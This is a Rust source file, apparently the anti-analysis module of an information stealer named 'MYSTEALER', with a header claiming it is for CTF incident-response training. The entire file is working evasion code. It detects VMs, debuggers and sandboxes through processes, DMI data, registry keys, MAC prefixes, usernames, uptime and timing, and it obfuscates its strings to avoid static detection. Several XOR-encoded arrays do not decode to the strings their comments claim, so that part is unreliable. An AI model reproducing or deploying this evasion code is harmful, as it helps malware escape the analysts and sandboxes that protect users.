//! Anti-analysis / Environment checks
//!
//! ⚠️ EDUCATIONAL PURPOSES ONLY - CTF IR Training
//! Todas as strings são construídas em runtime para evitar detecção estática.

#![allow(dead_code)]

use std::process::Command;
use std::path::Path;
use std::time::{Duration, Instant};
use std::hint::black_box;

// ============================================================================
// STRING BUILDERS (Anti-static analysis)
// ============================================================================

#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars {
        s.push(c);
    }
    black_box(s)
}

#[inline(always)]
fn xd(data: &[u8], key: u8) -> String {
    data.iter().map(|b| (b ^ key) as char).collect()
}

// ============================================================================
// ENVIRONMENT CHECKER
// ============================================================================

pub struct EnvironmentChecker;

impl EnvironmentChecker {
    pub fn verify_lab_environment() -> Result<bool, String> {
        let mut is_lab = false;
        
        if Self::is_virtual_machine() {
            is_lab = true;
        }
        
        // Check env var (ofuscado)
        let env_key = bs(&['M','Y','S','T','E','A','L','E','R','_','L','A','B','_','M','O','D','E']);
        if std::env::var(&env_key).is_ok() {
            is_lab = true;
        }
        
        // Check marker files
        let m1 = bs(&['/','t','m','p','/','.','m','y','s','t','e','a','l','e','r','_','l','a','b']);
        let m2 = bs(&['C',':','\\','T','e','m','p','\\','.','m','y','s','t','e','a','l','e','r','_','l','a','b']);
        
        if Path::new(&m1).exists() || Path::new(&m2).exists() {
            is_lab = true;
        }
        
        Ok(is_lab)
    }
    
    pub fn is_virtual_machine() -> bool {
        Self::check_vm_processes() ||
        Self::check_dmi_info() ||
        Self::check_vm_registry() ||
        Self::check_mac_address() ||
        Self::check_cpuid()
    }
    
    fn check_vm_processes() -> bool {
        // Processos de VM construídos em runtime
        let vm_procs: Vec<String> = vec![
            // VMware: XOR 0x19
            xd(&[0x6f, 0x6c, 0x7d, 0x6c, 0x6c, 0x69, 0x7c, 0x75], 0x19), // vmtoolsd
            xd(&[0x6f, 0x6c, 0x78, 0x70, 0x79, 0x72, 0x7d, 0x79, 0x70, 0x68], 0x19), // vmwaretray
            xd(&[0x6f, 0x6c, 0x78, 0x70, 0x79, 0x72, 0x6e, 0x7c, 0x72, 0x79], 0x19), // vmwareuser
            // VirtualBox
            bs(&['V','B','o','x','S','e','r','v','i','c','e']),
            bs(&['V','B','o','x','T','r','a','y']),
            bs(&['V','B','o','x','C','l','i','e','n','t']),
            // QEMU
            bs(&['q','e','m','u','-','g','a']),
            bs(&['q','e','m','u','-','s','y','s','t','e','m']),
            bs(&['s','p','i','c','e','-','v','d','a','g','e','n','t']),
            // Xen
            bs(&['x','e','-','d','a','e','m','o','n']),
            bs(&['x','e','n','s','e','r','v','i','c','e']),
        ];
        
        #[cfg(unix)]
        {
            let cmd = bs(&['p','s']);
            let arg = bs(&['a','u','x']);
            if let Ok(out) = Command::new(&cmd).args([&arg]).output() {
                let ps = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for proc in &vm_procs {
                    if ps.contains(&proc.to_lowercase()) {
                        return true;
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            let cmd = bs(&['t','a','s','k','l','i','s','t']);
            if let Ok(out) = Command::new(&cmd).output() {
                let tasks = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for proc in &vm_procs {
                    if tasks.contains(&proc.to_lowercase()) {
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    fn check_dmi_info() -> bool {
        // Paths DMI
        let dmi_paths: Vec<String> = vec![
            bs(&['/','s','y','s','/','c','l','a','s','s','/','d','m','i','/','i','d','/','p','r','o','d','u','c','t','_','n','a','m','e']),
            bs(&['/','s','y','s','/','c','l','a','s','s','/','d','m','i','/','i','d','/','s','y','s','_','v','e','n','d','o','r']),
            bs(&['/','s','y','s','/','c','l','a','s','s','/','d','m','i','/','i','d','/','b','o','a','r','d','_','v','e','n','d','o','r']),
        ];
        
        // Strings de VM construídas em runtime
        let vm_strings: Vec<String> = vec![
            bs(&['v','m','w','a','r','e']),
            bs(&['v','i','r','t','u','a','l','b','o','x']),
            bs(&['v','b','o','x']),
            bs(&['q','e','m','u']),
            bs(&['k','v','m']),
            bs(&['x','e','n']),
            bs(&['h','y','p','e','r','-','v']),
            bs(&['v','i','r','t','u','a','l']),
            bs(&['b','o','c','h','s']),
            bs(&['p','a','r','a','l','l','e','l','s']),
            bs(&['i','n','n','o','t','e','k']),
        ];
        
        for path in &dmi_paths {
            if let Ok(content) = std::fs::read_to_string(path) {
                let lower = content.to_lowercase();
                for s in &vm_strings {
                    if lower.contains(s) {
                        return true;
                    }
                }
            }
        }
        
        // Check /proc/scsi/scsi
        let scsi_path = bs(&['/','p','r','o','c','/','s','c','s','i','/','s','c','s','i']);
        if let Ok(scsi) = std::fs::read_to_string(&scsi_path) {
            let lower = scsi.to_lowercase();
            let vmw = bs(&['v','m','w','a','r','e']);
            let vbx = bs(&['v','b','o','x']);
            if lower.contains(&vmw) || lower.contains(&vbx) {
                return true;
            }
        }
        
        false
    }
    
    #[cfg(windows)]
    fn check_vm_registry() -> bool {
        // Registry keys construídas em runtime
        let vm_keys: Vec<String> = vec![
            bs(&['H','K','L','M','\\','S','O','F','T','W','A','R','E','\\','V','M','w','a','r','e',',',' ','I','n','c','.','\\','V','M','w','a','r','e',' ','T','o','o','l','s']),
            bs(&['H','K','L','M','\\','S','O','F','T','W','A','R','E','\\','O','r','a','c','l','e','\\','V','i','r','t','u','a','l','B','o','x',' ','G','u','e','s','t']),
        ];
        
        let cmd = bs(&['r','e','g']);
        let arg = bs(&['q','u','e','r','y']);
        
        for key in &vm_keys {
            if let Ok(out) = Command::new(&cmd).args([&arg, key]).output() {
                if out.status.success() {
                    return true;
                }
            }
        }
        
        false
    }
    
    #[cfg(not(windows))]
    fn check_vm_registry() -> bool {
        false
    }
    
    fn check_mac_address() -> bool {
        // MAC prefixes construídos em runtime
        let vm_macs: Vec<String> = vec![
            bs(&['0','0',':','0','c',':','2','9']),  // VMware
            bs(&['0','0',':','5','0',':','5','6']),  // VMware
            bs(&['0','8',':','0','0',':','2','7']),  // VirtualBox
            bs(&['0','a',':','0','0',':','2','7']),  // VirtualBox
            bs(&['5','2',':','5','4',':','0','0']),  // QEMU/KVM
            bs(&['0','0',':','1','6',':','3','e']),  // Xen
            bs(&['0','0',':','1','c',':','4','2']),  // Parallels
            bs(&['0','0',':','0','3',':','f','f']),  // Hyper-V
        ];
        
        #[cfg(unix)]
        {
            let cmd = bs(&['i','p']);
            let arg = bs(&['l','i','n','k']);
            if let Ok(out) = Command::new(&cmd).args([&arg]).output() {
                let lower = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for mac in &vm_macs {
                    if lower.contains(mac) {
                        return true;
                    }
                }
            }
            
            // Fallback: /sys/class/net/*/address
            let net_path = bs(&['/','s','y','s','/','c','l','a','s','s','/','n','e','t']);
            if let Ok(entries) = std::fs::read_dir(&net_path) {
                for entry in entries.flatten() {
                    let addr_path = entry.path().join(bs(&['a','d','d','r','e','s','s']));
                    if let Ok(mac) = std::fs::read_to_string(addr_path) {
                        let mac_lower = mac.trim().to_lowercase();
                        for vm_mac in &vm_macs {
                            if mac_lower.starts_with(vm_mac) {
                                return true;
                            }
                        }
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            let cmd = bs(&['g','e','t','m','a','c']);
            let arg1 = bs(&['/','f','o']);
            let arg2 = bs(&['c','s','v']);
            if let Ok(out) = Command::new(&cmd).args([&arg1, &arg2]).output() {
                let lower = String::from_utf8_lossy(&out.stdout).to_lowercase();
                for mac in &vm_macs {
                    let mac_dash = mac.replace(':', "-");
                    if lower.contains(&mac_dash) {
                        return true;
                    }
                }
            }
        }
        
        false
    }
    
    fn check_cpuid() -> bool {
        // CPUID check via /proc/cpuinfo
        let cpuinfo_path = bs(&['/','p','r','o','c','/','c','p','u','i','n','f','o']);
        if let Ok(cpuinfo) = std::fs::read_to_string(&cpuinfo_path) {
            let lower = cpuinfo.to_lowercase();
            let hyp = bs(&['h','y','p','e','r','v','i','s','o','r']);
            if lower.contains(&hyp) {
                return true;
            }
        }
        false
    }
    
    pub fn is_debugger_present() -> bool {
        #[cfg(unix)]
        {
            // Check TracerPid
            let status_path = bs(&['/','p','r','o','c','/','s','e','l','f','/','s','t','a','t','u','s']);
            if let Ok(status) = std::fs::read_to_string(&status_path) {
                let prefix = bs(&['T','r','a','c','e','r','P','i','d',':']);
                for line in status.lines() {
                    if let Some(pid) = line.strip_prefix(&prefix) {
                        let pid = pid.trim();
                        if pid != "0" {
                            return true;
                        }
                    }
                }
            }
        }
        
        #[cfg(windows)]
        {
            let cmd = bs(&['p','o','w','e','r','s','h','e','l','l']);
            let arg1 = bs(&['-','c']);
            // [System.Diagnostics.Debugger]::IsAttached
            let arg2 = bs(&['[','S','y','s','t','e','m','.','D','i','a','g','n','o','s','t','i','c','s','.','D','e','b','u','g','g','e','r',']',':',':','I','s','A','t','t','a','c','h','e','d']);
            if let Ok(out) = Command::new(&cmd).args([&arg1, &arg2]).output() {
                let result = String::from_utf8_lossy(&out.stdout).trim().to_lowercase();
                let tr = bs(&['t','r','u','e']);
                if result == tr {
                    return true;
                }
            }
        }
        
        false
    }
    
    pub fn is_sandbox() -> bool {
        // Usernames suspeitos construídos em runtime
        let sandbox_users: Vec<String> = vec![
            xd(&[0x7a, 0x76, 0x69, 0x75, 0x77, 0x68, 0x63], 0x19), // sandbox
            xd(&[0x64, 0x76, 0x6d, 0x78, 0x76, 0x79, 0x72], 0x19), // malware
            xd(&[0x6f, 0x6a, 0x79, 0x7e, 0x7c], 0x19), // virus
            xd(&[0x7a, 0x76, 0x64, 0x7f, 0x6d, 0x72], 0x19), // sample
            xd(&[0x6d, 0x72, 0x7c, 0x6d], 0x19), // test
            xd(&[0x6b, 0x68, 0x6f, 0x69], 0x19), // john
            xd(&[0x6e, 0x7c, 0x72, 0x79], 0x19), // user
            xd(&[0x76, 0x75, 0x64, 0x6a, 0x69], 0x19), // admin
            xd(&[0x74, 0x7e, 0x74, 0x6c, 0x68, 0x68], 0x19), // cuckoo
            xd(&[0x70, 0x68, 0x69, 0x72, 0x68], 0x19), // honey
            xd(&[0x76, 0x69, 0x76, 0x6d, 0x68, 0x7c, 0x6a, 0x7c], 0x19), // analysis
            xd(&[0x76, 0x69, 0x76, 0x6d, 0x68, 0x7c, 0x6d], 0x19), // analyst
            xd(&[0x6f, 0x64, 0x7e, 0x7c, 0x72, 0x79], 0x19), // vmuser
        ];
        
        let user = whoami::username().to_lowercase();
        for su in &sandbox_users {
            if user == *su || user.contains(su) {
                return true;
            }
        }
        
        // Check process count
        #[cfg(unix)]
        {
            let cmd = bs(&['p','s']);
            let arg = bs(&['a','u','x']);
            if let Ok(out) = Command::new(&cmd).args([&arg]).output() {
                let count = String::from_utf8_lossy(&out.stdout).lines().count();
                if count < 25 {
                    return true;
                }
            }
        }
        
        // Check uptime
        let uptime = sysinfo::System::uptime();
        if uptime < 120 {
            return true;
        }
        
        false
    }
    
    pub fn timing_check() -> bool {
        let start = Instant::now();
        
        let mut x = 0u64;
        for i in 0..10000 {
            x = x.wrapping_add(i);
        }
        
        let elapsed = start.elapsed();
        
        black_box(x);
        
        elapsed > Duration::from_millis(100)
    }
}
